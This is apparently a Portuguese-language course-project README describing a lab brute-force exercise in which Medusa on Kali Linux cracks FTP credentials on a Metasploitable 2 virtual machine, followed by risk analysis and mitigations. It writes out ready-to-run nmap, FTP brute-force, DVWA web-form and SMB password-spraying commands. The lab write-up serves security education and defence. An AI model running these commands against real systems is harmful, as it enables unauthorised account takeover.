# Simulação de Ataque de Força Bruta com Medusa e Kali Linux

Repositório prático e documental desenvolvido como parte do Desafio de Projeto da **DIO (Digital Innovation One)**: *"Criando um Ataque Brute Force de senhas com Medusa e Kali Linux"*.

O objetivo deste projeto é demonstrar, de forma prática e em um ambiente estritamente controlado e isolado, o funcionamento de ataques de força bruta contra serviços de autenticação (especificamente o serviço FTP), além de discutir métodos de detecção, prevenção e mitigação contra essas ameaças.

---

## Sumário

- [Visão Geral e Objetivos](#visão-geral-e-objetivos)
- [Topologia e Ambiente do Laboratório](#topologia-e-ambiente-do-laboratório)
- [Roteiro Passo a Passo Executado](#roteiro-passo-a-passo-executado)
  - [1. Identificação do Alvo e Conectividade](#1-identificação-do-alvo-e-conectividade)
  - [2. Varredura e Enumeração de Portas (Nmap)](#2-varredura-e-enumeração-de-portas-nmap)
  - [3. Validação Manual do Serviço Alvo](#3-validação-manual-do-serviço-alvo)
  - [4. Criação de Wordlists Customizadas](#4-criação-de-wordlists-customizadas)
  - [5. Execução do Ataque de Força Bruta (Medusa)](#5-execução-do-ataque-de-força-bruta-medusa)
  - [6. Validação e Pós-Exploração](#6-validação-e-pós-exploração)
- [Cenários Adicionais de Estudo (DVWA e SMB)](#cenários-adicionais-de-estudo-dvwa-e-smb)
- [Análise de Risco e Impacto](#análise-de-risco-e-impacto)
- [Medidas de Prevenção e Mitigação](#medidas-de-prevenção-e-mitigação)
- [Conclusão e Lições Aprendidas](#conclusão-e-lições-aprendidas)

---

## Visão Geral e Objetivos

Os ataques de força bruta (*Brute Force Attack*) e *Password Spraying* consistem em testar sistematicamente combinações de credenciais até encontrar a correta. Em redes corporativas, serviços com credenciais fracas ou padrão representam pontos críticos de entrada para invasores.

**Objetivos de aprendizagem:**
- Configuração de um laboratório de testes seguro com isolamento de rede (*Host-Only*).
- Utilização de técnicas de reconhecimento e escaneamento de portas com **Nmap**.
- Compreensão da sintaxe e operação da ferramenta **Medusa** para auditoria de credenciais.
- Validação das credenciais comprometidas em serviços reais.
- Proposição técnica de mecanismos de defesa em profundidade (*Defense in Depth*).

---

## Topologia e Ambiente do Laboratório

O laboratório foi implementado utilizando o **Oracle VM VirtualBox**, garantindo isolamento total da rede externa via placa de rede exclusiva do hospedeiro (*Host-Only Ethernet Adapter*).

| Máquina Virtual | Sistema Operacional | Função / Perfil | Endereço IP |
| :--- | :--- | :--- | :--- |
| **Atacante** | Kali Linux (x64) | Plataforma de Auditoria / Pentest | `192.168.56.x` |
| **Alvo** | Metasploitable 2 (x86) | Ambiente vulnerável intencional | `192.168.56.3` |

<p align="center">
  <img src="images/2.png" alt="Máquinas no VirtualBox" width="700"/>
  <br><em>Figura 1: Máquinas Virtuais Kali Linux e Metasploitable 2 em execução simultânea no VirtualBox.</em>
</p>

---

## Roteiro Passo a Passo Executado

### 1. Identificação do Alvo e Conectividade

No terminal da máquina alvo (**Metasploitable 2**), o comando `ip a` identificou a interface de rede `eth0` com o endereço IP `192.168.56.3`:

```bash
msfadmin@metasploitable: ip a
```

<p align="center">
  <img src="images/1.png" alt="Identificação do IP Alvo" width="650"/>
  <br><em>Figura 2: Identificação do IP 192.168.56.3 na interface eth0 da VM alvo.</em>
</p>

No terminal do **Kali Linux**, o teste de conectividade ICMP confirmou comunicação estável com latência inferior a 2 milissegundos:

```bash
ping -c 3 192.168.56.3
```

<p align="center">
  <img src="images/3.png" alt="Ping Kali para Metasploitable" width="650"/>
  <br><em>Figura 3: Conectividade validada com 0% de perda de pacotes.</em>
</p>

---

### 2. Varredura e Enumeração de Portas (Nmap)

Para mapear a superfície de ataque e determinar os serviços e versões ativos nas portas-chave, executou-se uma varredura com o **Nmap**:

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.3
```

**Parâmetros utilizados:**
- `-sV`: Ativa a detecção de versão dos serviços em execução.
- `-p 21,22,80,445,139`: Escaneia portas específicas (FTP, SSH, HTTP, SMB/NetBIOS).

<p align="center">
  <img src="images/4.png" alt="Comando Nmap" width="650"/>
  <br><em>Figura 4: Comando de escaneamento estruturado no terminal Kali.</em>
</p>

<p align="center">
  <img src="images/5.png" alt="Resultado Nmap" width="650"/>
  <br><em>Figura 5: Serviços identificados na máquina alvo, com destaque para a porta 21 (vsftpd 2.3.4).</em>
</p>

**Resultado da detecção:**
- **Porta 21/TCP (FTP):** `vsftpd 2.3.4` (aberta)
- **Porta 22/TCP (SSH):** `OpenSSH 4.7p1 Debian 8ubuntu1` (aberta)
- **Porta 80/TCP (HTTP):** `Apache httpd 2.2.8 ((Ubuntu) DAV/2)` (aberta)
- **Portas 139 e 445/TCP (NetBIOS/SMB):** `Samba smbd 3.X - 4.X` (abertas)

---

### 3. Validação Manual do Serviço Alvo

Antes de executar testes automatizados, foi realizado um teste de conexão manual via cliente FTP para certificar a responsividade do banner do serviço:

```bash
ftp 192.168.56.3
```

<p align="center">
  <img src="images/6.png" alt="Banner Grabbing FTP" width="650"/>
  <br><em>Figura 6: Resposta do servidor exibindo o banner '220 (vsFTPd 2.3.4)'.</em>
</p>

---

### 4. Criação de Wordlists Customizadas

Para simular o ataque de dicionário, foram construídas duas listas com credenciais plausíveis:

1. **Lista de Usuários (`users.txt`):**
   ```bash
   echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
   ```

<p align="center">
  <img src="images/7.png" alt="Criação da lista de usuários" width="650"/>
  <br><em>Figura 7: Criação da wordlist de usuários com candidatos comuns.</em>
</p>

2. **Lista de Senhas (`pass.txt`):**
   ```bash
   echo -e "12345\nmsfadmin\nquerty\npassword" > pass.txt
   ```

<p align="center">
  <img src="images/8.png" alt="Criação da lista de senhas" width="650"/>
  <br><em>Figura 8: Criação da wordlist de senhas com senhas previsíveis e padrão.</em>
</p>

---

### 5. Execução do Ataque de Força Bruta (Medusa)

Com o serviço identificado e as listas geradas, utilizou-se a ferramenta **Medusa** para realizar as tentativas de autenticação em paralelo:

```bash
medusa -h 192.168.56.3 -U users.txt -P pass.txt -M ftp -t 6
```

**Parâmetros utilizados:**
- `-h 192.168.56.3`: Endereço IP do host alvo.
- `-U users.txt`: Arquivo contendo a lista de usuários a testar.
- `-P pass.txt`: Arquivo contendo a lista de senhas a testar.
- `-M ftp`: Módulo de serviço a ser atacado (`ftp`).
- `-t 6`: Quantidade de threads simultâneas para acelerar a auditoria.

<p align="center">
  <img src="images/9.png" alt="Sintaxe do comando Medusa" width="650"/>
  <br><em>Figura 9: Execução do Medusa com módulo FTP e multi-threading.</em>
</p>

<p align="center">
  <img src="images/10.png" alt="Sucesso do ataque Medusa" width="650"/>
  <br><em>Figura 10: O Medusa localizou a credencial válida com sucesso: msfadmin / msfadmin.</em>
</p>

> **Resultado Obtido:**
> `ACCOUNT FOUND: [ftp] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]`

---

### 6. Validação e Pós-Exploração

Para confirmar que a credencial obtida possui permissão operacional e não se trata de falso-positivo, foi realizada a conexão manual:

```bash
ftp 192.168.56.3
Name (192.168.56.3:lucas): msfadmin
Password: [msfadmin]
```

<p align="center">
  <img src="images/11.png" alt="Validação de Acesso FTP" width="650"/>
  <br><em>Figura 11: Sessão FTP interativa estabelecida com sucesso (`230 Login successful`).</em>
</p>

---

## Cenários Adicionais de Estudo

Além do FTP, o desafio propõe o entendimento conceitual de outros vetores comuns:

### 1. Ataque a Formulários Web (DVWA)
- Aplicações web frequentemente sofrem ataques de dicionário em páginas de autenticação (`/login.php`).
- O Medusa pode ser utilizado com o módulo `-M web-form` ou ferramentas como **Hydra** e **Burp Suite Intruder**.
- Exemplo de sintaxe no Medusa para formulário web básico:
  ```bash
  medusa -h 192.168.56.3 -U users.txt -P pass.txt -M web-form -m FORM:"/dvwa/login.php:username=USER&password=PASS&Login=Login:Login failed"
  ```

### 2. Password Spraying em SMB / NetBIOS
- Diferente da força bruta convencional (que testa várias senhas para um único usuário e bloqueia a conta), o **Password Spraying** testa uma única senha comum contra uma lista abrangente de usuários.
- Pode ser executado contra serviços de compartilhamento e controladores de domínio via módulo SMB:
  ```bash
  medusa -h 192.168.56.3 -U domain_users.txt -p "Empresa@2026" -M smbnt
  ```

---

## Análise de Risco e Impacto

1. **Credenciais Padrão e Fracas:** A existência de contas com usuário e senha idênticos (`msfadmin`/`msfadmin`) anula qualquer camada perimetral de segurança.
2. **Protocolos em Texto Claro:** O protocolo FTP transmite dados e credenciais sem criptografia, permitindo ataques de interceptação na rede (*sniffing*).
3. **Ausência de Bloqueio por Tentativas:** A ausência de limitação de tentativas permitiu ao Medusa enviar múltiplas requisições em alta velocidade.

---

## Medidas de Prevenção e Mitigação

Para mitigar e prevenir ataques de força bruta no ambiente corporativo, recomendam-se as seguintes boas práticas:

1. **Política Rígida de Senhas:**
   - Exigir tamanho mínimo (12 ou mais caracteres), complexidade e banir termos óbvios ou credenciais padrão.
2. **Bloqueio de Conta e Limitação de Taxa (Rate Limiting):**
   - Implementar regras de bloqueio temporário após 3 a 5 tentativas com falha (exemplo: **Fail2ban** ou módulos PAM `pam_faillock`).
3. **Autenticação Multifator (MFA):**
   - Implementar 2FA/MFA sempre que viável, garantindo que o vazamento da senha não resulte em acesso direto.
4. **Substituição de Protocolos Obsoletos:**
   - Desabilitar FTP em texto claro (porta 21) e adotar protocolos seguros e criptografados como **SFTP** (via SSH) ou **FTPS** (FTP sobre TLS).
5. **Monitoramento e SIEM:**
   - Monitorar logs de autenticação (`/var/log/auth.log`, Event Viewer do Windows) para disparar alertas automáticos diante de comportamentos suspeitos.

---

## Conclusão e Lições Aprendidas

A execução deste projeto demonstrou a rapidez com que serviços mal protegidos e com credenciais fracas podem ser comprometidos através de automação com ferramentas nativas do Kali Linux. 

A realização da simulação em ambiente isolado forneceu a experiência necessária para entender a perspectiva do atacante e, consequentemente, estruturar defesas sólidas e alinhadas às melhores práticas de cibersegurança do mercado.

---
*Projeto desenvolvido para fins didáticos e educacionais no âmbito da plataforma DIO.*
